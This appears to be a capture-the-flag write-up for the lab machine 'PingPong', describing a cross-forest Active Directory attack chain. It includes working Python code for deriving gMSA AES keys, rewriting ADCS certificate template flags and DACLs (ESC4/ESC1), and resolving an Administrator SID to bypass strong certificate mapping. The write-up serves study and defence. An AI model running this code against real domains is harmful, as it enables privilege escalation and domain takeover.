Machine Overview

PingPong is an insane-difficulty dual-forest Active Directory machine requiring chained exploitation across two domains. The chain spans ADCS ESC13 for initial WinRM access to PING.HTB, a Chisel tunnel to the isolated PONG.HTB DC, gMSA password blob re-encoding for AES key derivation, RBCD S4U2Proxy to MSSQL, GodPotato privilege escalation, VSS-based NTDS dumping, and a cross-forest ESC4+ESC1 ADCS attack with KB5014754 Strong Certificate Mapping bypass to obtain Administrator access on PING.HTB.

07
gMSA AES Key Derivation — UTF-16LE → UTF-8 Re-Encoding
PONG.HTB · Phase 07

The raw msDS-ManagedPassword blob is a 256-byte UTF-16LE password. Impacket's string_to_key expects UTF-8 bytes (as a domain-joined Windows machine computes it). The critical non-obvious step: decode the blob as UTF-16LE, then re-encode as UTF-8 before calling string_to_key.

python3 — gMSA AES key derivation
from impacket.krb5.crypto import string_to_key

blob_bytes = ...  # raw 256-byte gMSA blob from msDS-ManagedPassword

# Non-standard: decode UTF-16LE, re-encode to UTF-8 for string_to_key
pw_str  = blob_bytes.decode('utf-16-le', errors='replace')
pw_utf8 = pw_str.encode('utf-8')

salt      = b'PONG.HTBhostpong_gmsa.pong.htb'
aes256_key = string_to_key(18, pw_utf8, salt)
# AES-256: 9a3d021763ac0f2ceb3b629eddf92fee758a3ba6fce28269a2d35a3e252e539a
✕
gMSA AES Key Non-Standard Encoding: The raw gMSA blob is stored as UTF-16LE. Passing the raw bytes to string_to_key silently produces the wrong AES key. The domain-joined Windows machine re-encodes via UTF-16LE→string→UTF-8 before key derivation. This non-obvious step is required for the TGT to authenticate.

import socket, os

# Patch forward DNS: dc1.ping.htb → 10.129.40.206
_orig_gai = socket.getaddrinfo
def _patched_gai(host, port, *a, **kw):
    if isinstance(host, str) and host.lower() == 'dc1.ping.htb':
        host = '10.129.40.206'
    return _orig_gai(host, port, *a, **kw)
socket.getaddrinfo = _patched_gai

# Patch reverse DNS: needed by ldap3 to build correct GSSAPI SPN
_orig_gba = socket.gethostbyaddr
def _patched_gba(addr):
    if addr == '10.129.40.206':
        return ('dc1.ping.htb', ['dc1.ping.htb'], ['10.129.40.206'])
    return _orig_gba(addr)
socket.gethostbyaddr = _patched_gba

ESC4 — Enable ENROLLEE_SUPPLIES_SUBJECT on SmartcardAuthentication
Cross-Forest · Phase 12

R.Martinelli's CA Managers membership grants WriteProperty on all templates in PING.HTB. Setting bit 0 of msPKI-Certificate-Name-Flag on the SmartcardAuthentication template enables ENROLLEE_SUPPLIES_SUBJECT — allowing requesters to specify an arbitrary UPN (ESC1 condition).

python3 — ESC4 modification
TEMPLATE_DN = 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb'

# Read current flag (0xA1000000 — ENROLLEE_SUPPLIES_SUBJECT bit NOT set)
conn.search(TEMPLATE_DN, '(objectClass=*)',
    attributes=['msPKI-Certificate-Name-Flag'])

from ldap3 import MODIFY_REPLACE
new_flag = -1577058304 | 1  # = -1577058303 (0xA1000001)
conn.modify(TEMPLATE_DN, {
    'msPKI-Certificate-Name-Flag': [(MODIFY_REPLACE, [new_flag])]
})
13
ESC1 ACL — Add Full Control for Authenticated Users
Cross-Forest · Phase 13

The template's default enrollment rights only allow Domain Admins. Add a Full Control ACE for Authenticated Users (SID S-1-5-11) via nTSecurityDescriptor. The SD_FLAGS LDAP control (OID 1.2.840.113556.1.4.801, value=4) restricts the write to the DACL only.

python3 — SD_FLAGS control + Full Control ACE
from impacket.ldap.ldaptypes import (SR_SECURITY_DESCRIPTOR, ACE,
    ACCESS_ALLOWED_ACE, LDAP_SID, ACCESS_MASK)
from pyasn1.type import univ
from pyasn1.codec.ber import encoder as ber_enc

# Build SD_FLAGS control (operate on DACL only)
seq = univ.Sequence()
seq.setComponentByPosition(0, univ.Integer(4))
sd_flags_control = ('1.2.840.113556.1.4.801', False, ber_enc.encode(seq))

# Read current DACL
conn.search(TEMPLATE_DN, '(objectClass=*)',
    attributes=['nTSecurityDescriptor'],
    controls=[sd_flags_control])
sd = SR_SECURITY_DESCRIPTOR(data=bytes(conn.entries[0]['nTSecurityDescriptor'].raw_values[0]))

# Build Full Control ACE for Authenticated Users (S-1-5-11)
mask = ACCESS_MASK(); mask['Mask'] = 0x000F01FF
sid = LDAP_SID(); sid.fromCanonical('S-1-5-11')
inner = ACCESS_ALLOWED_ACE(); inner['Mask'] = mask; inner['Sid'] = sid
ace = ACE(); ace['AceType'] = 0x00; ace['AceFlags'] = 0x00; ace['Ace'] = inner

sd['Dacl']['Data'].append(ace)
sd['Dacl']['AceCount'] = len(sd['Dacl']['Data'])
conn.modify(TEMPLATE_DN, {
    'nTSecurityDescriptor': [(MODIFY_REPLACE, [sd.getData()])]
}, controls=[sd_flags_control])
⚠
SD_FLAGS Control: When writing nTSecurityDescriptor to modify only the DACL, the control must be a tuple (oid, criticality, ber_value) — not a pyasn1 object. Incorrect control format causes ldap3 to silently ignore the control and overwrite the full SD, potentially removing the owner/SACL.

Root — ESC1 Cert + KB5014754 SID + PKINIT

14
certipy req -sid — Strong Certificate Mapping Bypass
Root · Phase 14

PING.HTB enforces KB5014754 Strong Certificate Mapping. Without the target user's objectSid embedded in the certificate, the KDC returns KDC_ERR_CERTIFICATE_MISMATCH. The -sid flag in certipy embeds the SID in both the szOID_NTDS_CA_SECURITY_EXT extension and a tag:microsoft.com,2022-09-14:sid: URI in the SAN. Without -debug, certipy uses the dynamic RPC TCP endpoint mapper (port 135) which is unreachable from Kali. With -debug it falls back to the SMB named pipe \pipe\cert.

python3 — resolve Administrator SID
conn.search('DC=ping,DC=htb', '(sAMAccountName=Administrator)',
    attributes=['objectSid'])
# S-1-5-21-750635624-2058721901-1932338391-500

KB5014754 Strong Certificate Mapping: PING.HTB enforces full Strong Certificate Mapping (not compatibility mode). The certificate must contain the objectSid in szOID_NTDS_CA_SECURITY_EXT (OID 1.3.6.1.4.1.311.25.2) and/or as a tag:microsoft.com,2022-09-14:sid: URI in the SAN. ⚠
-debug Required for Named Pipe Transport: Without -debug, certipy tries the dynamic TCP endpoint mapper (port 135). With -debug it falls back to \pipe\cert over SMB (port 445), which is accessible. This is a transport selection quirk in certipy v5.0.4.

key takeaways
// 01
ESC13 Issuance Policy OIDs Enable Phantom Group Membership
Linking a certificate template's issuance policy OID to an AD group causes the KDC to inject that group's SID into the PAC during PKINIT — regardless of the authenticating user's actual group membership. Certificate templates with issuance policy OIDs must be treated as group membership delegation mechanisms and audited accordingly.
// 02
gMSA AES Keys Require Non-Standard UTF-16LE→UTF-8 Re-Encoding
The raw gMSA password blob is stored as UTF-16LE. Impacket's string_to_key expects UTF-8 bytes — matching how a domain-joined Windows machine re-encodes the password internally. Passing the raw bytes produces a silently incorrect AES key. This re-encoding step is non-obvious and not documented in Impacket.
// 03
KB5014754 Requires SID in Two Certificate Locations
Strong Certificate Mapping enforces that the target user's objectSid appears in both the szOID_NTDS_CA_SECURITY_EXT extension and a SAN URI. Without the SID, PKINIT fails with KDC_ERR_CERTIFICATE_MISMATCH with no other diagnostic. certipy's -sid flag handles both placements.
// 04
ldap3 Reverse DNS Lookup Silently Breaks GSSAPI
ldap3 calls socket.gethostbyaddr(ip) at connection time to construct the GSSAPI SPN. In tunnel or split-DNS scenarios this resolves to the wrong name, producing an incorrect SPN and failing authentication silently. Both forward and reverse DNS lookups must be monkey-patched when working in restricted network environments.
// 05
DRSUAPI Tunnelling Requires VSS as Alternative
DRSUAPI uses dynamic RPC endpoint mapping over TCP port 135 — difficult to forward through a single port tunnel. VSS shadow copy provides a fully self-contained offline alternative: create the shadow, copy ntds.dit and SYSTEM hive, download over SMB, and run secretsdump locally. No port 135 required.
// 06
certipy -debug Forces Named Pipe Transport for Certificate Requests
Without -debug, certipy attempts the dynamic TCP RPC endpoint mapper (port 135), which is typically unreachable in tunnelled or restricted environments. The -debug flag forces fallback to the \pipe\cert named pipe over SMB — accessible whenever port 445 is available. This undocumented behaviour is essential when working through Chisel or similar tunnels.
